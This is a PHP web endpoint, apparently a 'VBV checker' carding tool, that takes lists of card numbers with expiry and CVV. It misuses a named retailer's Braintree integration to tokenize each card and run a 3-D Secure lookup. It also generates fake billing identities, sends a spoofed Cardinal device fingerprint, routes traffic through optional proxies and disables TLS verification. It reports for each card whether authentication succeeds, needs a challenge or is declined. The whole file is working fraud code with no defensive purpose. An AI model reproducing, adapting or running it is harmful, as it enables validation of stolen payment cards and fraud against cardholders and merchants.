<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

class SimpleFaker {
    private $first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles", "Daniel", "Matthew", "Anthony", "Donald", "Mark"];
    private $last_names = ["Smith", "Johnson", "Williams", "Jones", "Brown", "Davis", "Miller", "Wilson", "Moore", "Taylor", "Anderson", "Thomas", "Jackson", "White", "Harris"];
    private $streets = ["Main St", "High St", "Broadway", "2nd Ave", "Park Rd", "Oak St", "Pine St", "Maple Ave", "Cedar Ln", "Elm St", "Washington Blvd", "Lakeview Dr"];
    private $cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"];
    private $states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA", "FL", "OH", "NJ", "GA", "NC"];

    public function first_name() { return $this->first_names[array_rand($this->first_names)]; }
    public function last_name() { return $this->last_names[array_rand($this->last_names)]; }
    public function street_address() { return rand(100, 9999) . " " . $this->streets[array_rand($this->streets)]; }
    public function city() { return $this->cities[array_rand($this->cities)]; }
    public function state_abbr() { return $this->states[array_rand($this->states)]; }
    public function zip_code() { return str_pad(rand(10000, 99999), 5, '0', STR_PAD_LEFT); }
    public function phone_number() { return "(" . rand(200, 999) . ") " . rand(100, 999) . "-" . rand(1000, 9999); }
}

class VbvChecker {
    private $base_url = "https://www.digidirect.com.au";
    private $braintree_graphql_url = "https://payments.braintree-api.com/graphql";
    private $cardinal_url = "https://geoissuer.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData";
    private $user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
    private $faker;
    private $cookies = [];
    private $proxy = null;
    private $proxy_auth = null;

    public function __construct($proxy = null) {
        $this->faker = new SimpleFaker();
        
        // Parse proxy if provided (format: ip:port:user:pass)
        if ($proxy) {
            $parts = explode(':', $proxy);
            if (count($parts) >= 2) {
                $this->proxy = $parts[0] . ':' . $parts[1];
                if (count($parts) == 4) {
                    $this->proxy_auth = $parts[2] . ':' . $parts[3];
                }
            }
        }
    }

    public function check_card($card_line) {
        $parts = explode("|", $card_line);
        if (count($parts) < 4) {
            return [
                'card' => $card_line,
                'status' => 'invalid',
                'message' => 'Format Error',
                'bank' => '',
                'country' => '',
                'total' => ''
            ];
        }

        $cc = $parts[0];
        $mes = strlen($parts[1]) == 1 ? "0" . $parts[1] : $parts[1];
        $ano = strlen($parts[2]) == 2 ? "20" . $parts[2] : $parts[2];
        $cvv = $parts[3];

        try {
            $client_token_data = $this->get_braintree_token();
            if (!$client_token_data) {
                return [
                    'card' => $card_line,
                    'status' => 'error',
                    'message' => 'Failed to get token',
                    'bank' => '',
                    'country' => '',
                    'total' => ''
                ];
            }

            $session_b3 = $this->generate_b3_session_id();
            $tokenize_session_id = $this->generate_uuid();

            $token = $this->tokenize_card($cc, $mes, $ano, $cvv, $client_token_data['auth_fingerprint'], $tokenize_session_id);
            if (!$token) {
                return [
                    'card' => $card_line,
                    'status' => 'error',
                    'message' => 'Tokenization failed',
                    'bank' => '',
                    'country' => '',
                    'total' => ''
                ];
            }

            $hostname = "www.digidirect.com.au";
            $cardinal_payload = $this->generate_dynamic_fingerprint($hostname);
            $this->send_cardinal_data($cardinal_payload);
            $df_reference_id = "0_" . $this->generate_uuid();

            $lookup_result = $this->lookup_3ds(
                $cc, $mes, $ano, $token,
                $client_token_data['auth_fingerprint'],
                $client_token_data['merchant_id'],
                $df_reference_id,
                $session_b3,
                $hostname,
                $cvv
            );

            return $lookup_result;

        } catch (Exception $e) {
            return [
                'card' => $card_line,
                'status' => 'error',
                'message' => 'Exception: ' . $e->getMessage(),
                'bank' => '',
                'country' => '',
                'total' => ''
            ];
        }
    }

    private function get_braintree_token() {
        $this->cookies = [];

        $payload = json_encode([
            'query' => 'mutation createBraintreeClientToken { createBraintreeClientToken }'
        ]);

        $response = $this->make_request(
            $this->base_url . '/graphql',
            'POST',
            $payload,
            [
                'Accept: application/json',
                'Origin: ' . $this->base_url,
                'Content-Type: application/json'
            ]
        );

        $data = json_decode($response, true);
        $token = $data['data']['createBraintreeClientToken'] ?? null;

        if ($token) {
            return $this->decode_token($token);
        }
        return null;
    }

    private function decode_token($token) {
        try {
            if (strpos($token, 'ey') === 0) {
                $padding = strlen($token) % 4;
                if ($padding) {
                    $token .= str_repeat('=', 4 - $padding);
                }

                $decoded_bytes = base64_decode($token);
                $data = json_decode($decoded_bytes, true);

                $fingerprint = $data['authorizationFingerprint'] ?? null;
                $merchant_id = $data['merchantId'] ?? null;

                if (!$fingerprint) {
                    return null;
                }

                return [
                    'client_token' => $token,
                    'auth_fingerprint' => $fingerprint,
                    'merchant_id' => $merchant_id
                ];
            }
            return null;
        } catch (Exception $e) {
            return null;
        }
    }

    private function tokenize_card($cc, $mm, $yy, $cvv, $auth_token, $session_id) {
        $query = 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
            tokenizeCreditCard(input: $input) {
                token
                creditCard { bin brandCode last4 expirationMonth expirationYear }
            }
        }';

        $payload = json_encode([
            'clientSdkMetadata' => [
                'source' => 'client',
                'integration' => 'custom',
                'sessionId' => $session_id
            ],
            'query' => $query,
            'variables' => [
                'input' => [
                    'creditCard' => [
                        'number' => $cc,
                        'expirationMonth' => $mm,
                        'expirationYear' => $yy,
                        'cvv' => $cvv
                    ],
                    'options' => ['validate' => false]
                ]
            ],
            'operationName' => 'TokenizeCreditCard'
        ]);

        $response = $this->make_request(
            $this->braintree_graphql_url,
            'POST',
            $payload,
            [
                'Authorization: Bearer ' . $auth_token,
                'Braintree-Version: 2018-05-10',
                'Accept: application/json',
                'Content-Type: application/json'
            ]
        );

        $data = json_decode($response, true);
        return $data['data']['tokenizeCreditCard']['token'] ?? null;
    }

    private function lookup_3ds($cc, $mes, $ano, $token, $auth_fingerprint, $merchant_id, $df_reference_id, $session_id, $hostname, $cvv) {
        $billing = [
            'billingLine1' => $this->faker->street_address(),
            'billingCity' => $this->faker->city(),
            'billingState' => $this->faker->state_abbr(),
            'billingPostalCode' => $this->faker->zip_code(),
            'billingCountryCode' => 'US',
            'billingGivenName' => $this->faker->first_name(),
            'billingSurname' => $this->faker->last_name(),
            'billingPhoneNumber' => $this->faker->phone_number()
        ];

        $client_metadata = [
            'requestedThreeDSecureVersion' => '2',
            'sdkVersion' => 'web/3.94.0',
            'cardinalDeviceDataCollectionTimeElapsed' => rand(700, 800),
            'issuerDeviceDataCollectionTimeElapsed' => rand(5000, 5100),
            'issuerDeviceDataCollectionResult' => true
        ];

        $meta_obj = [
            'merchantAppId' => $hostname,
            'platform' => 'web',
            'sdkVersion' => '3.94.0',
            'source' => 'client',
            'integration' => 'custom',
            'integrationType' => 'custom',
            'sessionId' => $session_id
        ];

        $payload = json_encode([
            'amount' => 1,
            'additionalInfo' => $billing,
            'challengeRequested' => true,
            'bin' => substr($cc, 0, 6),
            'dfReferenceId' => $df_reference_id,
            'clientMetadata' => $client_metadata,
            'authorizationFingerprint' => $auth_fingerprint,
            'braintreeLibraryVersion' => 'braintree/web/3.94.0',
            '_meta' => $meta_obj,
            'browserColorDepth' => 24,
            'browserJavaEnabled' => false,
            'browserJavascriptEnabled' => true,
            'browserLanguage' => 'en-US',
            'browserScreenHeight' => 688,
            'browserScreenWidth' => 756,
            'browserTimeZone' => -480,
            'deviceChannel' => 'Browser'
        ]);

        $url = "https://api.braintreegateway.com/merchants/{$merchant_id}/client_api/v1/payment_methods/{$token}/three_d_secure/lookup";

        $response = $this->make_request(
            $url,
            'POST',
            $payload,
            [
                'Authorization: Bearer ' . $auth_fingerprint,
                'Braintree-Version: 2018-05-10',
                'Accept: application/json',
                'Content-Type: application/json'
            ]
        );

        $json_resp = json_decode($response, true);

        if (!$json_resp) {
            return [
                'card' => "$cc|$mes|$ano|$cvv",
                'status' => 'error',
                'message' => 'Invalid JSON',
                'bank' => '',
                'country' => '',
                'total' => ''
            ];
        }

        if (isset($json_resp['error'])) {
            $err_msg = $json_resp['error']['message'] ?? 'Unknown Error';
            return [
                'card' => "$cc|$mes|$ano|$cvv",
                'status' => 'error',
                'message' => $err_msg,
                'bank' => '',
                'country' => '',
                'total' => ''
            ];
        }

        $payment_method = $json_resp['paymentMethod'] ?? null;
        $three_ds_info = $payment_method['threeDSecureInfo'] ?? $json_resp['threeDSecureInfo'] ?? null;
        $status = $three_ds_info['status'] ?? $json_resp['status'] ?? null;

        if (!$status) {
            return [
                'card' => "$cc|$mes|$ano|$cvv",
                'status' => 'error',
                'message' => 'Empty Status',
                'bank' => '',
                'country' => '',
                'total' => ''
            ];
        }

        $status_lower = strtolower($status);
        if (in_array($status_lower, ['authenticate_successful', 'successful'])) {
            $final_status = 'success';
        } elseif ($status_lower == 'challenge_required') {
            $final_status = 'vbv_required';
        } elseif ($status_lower == 'authenticate_rejected') {
            $final_status = 'declined';
        } elseif ($status_lower == 'lookup_error') {
            $final_status = 'error';
        } else {
            $final_status = $status;
        }

        $bank_name = '';
        $country_code = '';

        $bin_data = $payment_method['binData'] ?? $json_resp['binData'] ?? null;
        if ($bin_data) {
            $bank_name = $bin_data['issuingBank'] ?? '';
            $country_code = $bin_data['countryOfIssuance'] ?? '';
        }

        return [
            'card' => "$cc|$mes|$ano|$cvv",
            'status' => $final_status,
            'message' => $status,
            'bank' => $bank_name,
            'country' => $country_code,
            'total' => '1.00'
        ];
    }

    private function generate_dynamic_fingerprint($hostname) {
        $ref_id = "0_" . $this->generate_uuid();
        $screen = [
            'FakedResolution' => false,
            'Ratio' => 1.7777777777777777,
            'Resolution' => '1920x1080',
            'UsableResolution' => '1920x1080',
            'CCAScreenSize' => '02'
        ];
        $extended = [
            'Browser' => [
                'Adblock' => false,
                'AvailableJsFonts' => [],
                'DoNotTrack' => 'unknown',
                'JavaEnabled' => false
            ],
            'Device' => [
                'ColorDepth' => 24,
                'Cpu' => 'unknown',
                'Platform' => 'Win32',
                'TouchSupport' => [
                    'MaxTouchPoints' => 0,
                    'OnTouchStartAvailable' => false,
                    'TouchEventCreationSuccessful' => false
                ]
            ]
        ];
        $plugins_str = json_encode([
            'bVSRIEK::TsWq89999HqdOmyCJECgQIECgYz4cOu::~a05',
            'ZrVxgvfu::IMtePPuXTw3bNtePHDBfXq0iZUpzhQIM::~4k5',
            'JavaScript doc Viewer::Portable Document Format::application/x-google-chrome-pdf~pdf',
            'OpenSource doc Viewer::::application/pdf~pdf'
        ]);
        return [
            'Cookies' => [
                'Legacy' => true,
                'LocalStorage' => true,
                'SessionStorage' => true
            ],
            'DeviceChannel' => 'Browser',
            'Extended' => $extended,
            'Fingerprint' => $this->generate_random_alphanumeric(32),
            'FingerprintingTime' => rand(100, 300),
            'FingerprintDetails' => ['Version' => '1.5.1'],
            'Language' => 'en-US',
            'OrgUnitId' => $this->generate_random_alphanumeric(24),
            'Origin' => 'Songbird',
            'Plugins' => $plugins_str,
            'ReferenceId' => $ref_id,
            'Referrer' => "https://{$hostname}/",
            'Screen' => $screen,
            'CallSignEnabled' => null,
            'ThreatMetrixEnabled' => false,
            'ThreatMetrixEventType' => 'PAYMENT',
            'ThreatMetrixAlias' => 'Default',
            'TimeOffset' => -480,
            'UserAgent' => $this->user_agent,
            'UserAgentDetails' => [
                'FakedOS' => false,
                'FakedBrowser' => false
            ],
            'BinSessionId' => $this->generate_uuid()
        ];
    }

    private function send_cardinal_data($payload) {
        try {
            $this->make_request(
                $this->cardinal_url,
                'POST',
                json_encode($payload),
                ['Content-Type: application/json']
            );
        } catch (Exception $e) {
            // Ignore errors
        }
    }

    private function generate_random_alphanumeric($length) {
        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        $result = '';
        for ($i = 0; $i < $length; $i++) {
            $result .= $chars[rand(0, strlen($chars) - 1)];
        }
        return $result;
    }

    private function generate_b3_session_id() {
        $rand = function($l) {
            return $this->generate_random_alphanumeric($l);
        };
        return $rand(8) . '-' . $rand(4) . '-' . $rand(4) . '-' . $rand(4) . '-' . $rand(12);
    }

    private function generate_uuid() {
        return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
            mt_rand(0, 0xffff), mt_rand(0, 0xffff),
            mt_rand(0, 0xffff),
            mt_rand(0, 0x0fff) | 0x4000,
            mt_rand(0, 0x3fff) | 0x8000,
            mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
        );
    }

    private function make_request($url, $method = 'GET', $data = null, $headers = []) {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_USERAGENT, $this->user_agent);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);

        // Set proxy if configured
        if ($this->proxy) {
            curl_setopt($ch, CURLOPT_PROXY, $this->proxy);
            if ($this->proxy_auth) {
                curl_setopt($ch, CURLOPT_PROXYUSERPWD, $this->proxy_auth);
            }
        }

        $default_headers = [
            'User-Agent: ' . $this->user_agent
        ];
        $all_headers = array_merge($default_headers, $headers);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $all_headers);

        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, true);
            if ($data) {
                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            }
        }

        // Cookie handling
        curl_setopt($ch, CURLOPT_HEADERFUNCTION, function($curl, $header) {
            $len = strlen($header);
            if (preg_match('/^Set-Cookie:\s*([^;]+)/i', $header, $matches)) {
                $this->cookies[] = $matches[1];
            }
            return $len;
        });

        if (!empty($this->cookies)) {
            curl_setopt($ch, CURLOPT_COOKIE, implode('; ', $this->cookies));
        }

        $response = curl_exec($ch);
        curl_close($ch);

        return $response;
    }
}

// Handle the request
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    
    if (!$input || !isset($input['cards'])) {
        echo json_encode(['error' => 'Invalid request']);
        exit;
    }

    $cards = $input['cards'];
    $proxy = $input['proxy'] ?? null;
    
    $checker = new VbvChecker($proxy);
    $results = [];

    foreach ($cards as $card) {
        $result = $checker->check_card(trim($card));
        $results[] = $result;
    }

    echo json_encode(['results' => $results]);
} else {
    echo json_encode(['error' => 'Method not allowed']);
}
?>
